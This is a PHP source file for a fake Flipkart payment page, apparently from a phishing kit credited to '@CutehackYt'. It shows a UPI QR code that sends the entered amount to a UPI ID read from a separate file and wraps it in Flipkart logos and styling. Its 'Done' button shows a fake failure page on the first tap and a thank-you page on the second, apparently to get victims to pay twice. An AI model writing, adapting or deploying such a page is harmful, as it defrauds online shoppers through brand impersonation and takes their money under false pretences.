<?php
header('Content-Type: text/html; charset=UTF-8');

// Get the amount from the URL parameter
$amount = $_GET['amount'] ?? '0';
if ($amount === '0') {
    echo '<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Error</title>
        <style>
            body { font-family: \'Roboto\', sans-serif; background-color: #f1f3f6; margin: 0; padding: 0; text-align: center; }
            .container { padding: 50px; background-color: #fff; border-radius: 8px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); display: inline-block; margin-top: 100px; }
            .error { color: #ff0000; font-size: 22px; font-weight: bold; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="error">
                You were fucked by @CutehackYt
            </div>
        </div>
    </body>
    </html>';
    exit;
}

// Fetch UPI ID from upi.php
$upiFileContent = file_get_contents('upi.php');

if ($upiFileContent === false) {
    die('Failed to read the UPI data file.');
}

$upiData = json_decode($upiFileContent, true);

if (json_last_error() !== JSON_ERROR_NONE) {
    die('Invalid JSON in UPI data file: ' . json_last_error_msg());
}

$upiId = $upiData['upi_id'] ?? '';

if (empty($upiId)) {
    die('UPI ID is missing in the JSON data.');
}

// Generate QR code data
$qrData = "upi://pay?pa=$upiId&pn=Flipkart%20Payment&am=$amount&cu=INR";
$encodedQrData = urlencode($qrData);
$qrCodeUrl = "https://api.qrserver.com/v1/create-qr-code/?data=$encodedQrData&size=150x150&ecc=H";
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flipkart QR Payment</title>
    <style>
        body{font-family:'Roboto',sans-serif;background-color:#f1f3f6;margin:0;padding:0}
        .navbar,.footer{background-color:#2874f0;color:#fff;padding:10px 20px;text-align:center}
        .navbar{position:fixed;top:0;width:100%;z-index:1000}
        .footer{position:fixed;bottom:0;height:40px;width:100%}
        .footer img{width:120px}
        .navbar img{float:left;margin-left:-5px;width:85px}
        .container{background-color:#fff;width:320px;padding:20px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.1);text-align:center;margin:0 auto;margin-top:60px}
        .amount{color:#2874f0;font-size:22px;margin-bottom:20px;font-weight:bold}
        .qr-code{margin:10px 0;padding:15px;border:2px dashed #2874f0;border-radius:8px;position:relative;display:inline-block;width:90%;height:auto}
        .qr-code img.qr{width:100%;height:auto;border-radius:8px}
        .qr-code img.overlay-logo{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:30px;height:30px;border-radius:5px;padding:5px}
        .instructions{color:#777;font-size:14px;margin-bottom:20px;line-height:1.5}
        .btn{background-color:#fb641b;color:#fff;border:none;padding:10px 15px;width:90%;font-size:16px;cursor:pointer;border-radius:5px;text-decoration:none;text-transform:uppercase;display:inline-block}
        .btn:hover{background-color:#e55a0b}
        .cheifop{margin-top:30%}
        .cheif{color:#000;font-size:22px;margin-bottom:20px;font-weight:bold}
    </style>
</head>
<body>

<div class="navbar">
    <img src="img/logo.png" alt="Flipkart Logo">
</div>
<div class="cheifop">
    <div class="container">
        <div class="cheif">
            <div>Total Amount To Pay ₹<span class="amount" id="orderAmount"><?php echo htmlspecialchars($amount, ENT_QUOTES, 'UTF-8'); ?></span></div>
        </div>
        <div class="qr-code">
            <img id="qrImage" class="qr" src="<?php echo htmlspecialchars($qrCodeUrl, ENT_QUOTES, 'UTF-8'); ?>" alt="QR Code">
            <img class="overlay-logo" src="img/small-logo.png" alt="Flipkart Overlay Logo">
        </div>
        <div class="instructions">
            Use any UPI app to scan the QR code<br>and complete your payment.
        </div>
        <a class="btn" href="#" id="doneButton">Done</a>
    </div>
</div>
<script>
    let tapCount = 0;

    document.getElementById('doneButton').addEventListener('click', function(event){
        event.preventDefault();
        tapCount++;
        const amount = '<?php echo addslashes($amount); ?>';
        if(tapCount === 1){
            window.location.href = `failed.php?amount=${amount}`;
        } else if(tapCount === 2){
            window.location.href = `thanks.php?amount=${amount}`;
        }
    });
</script>
</body>
</html>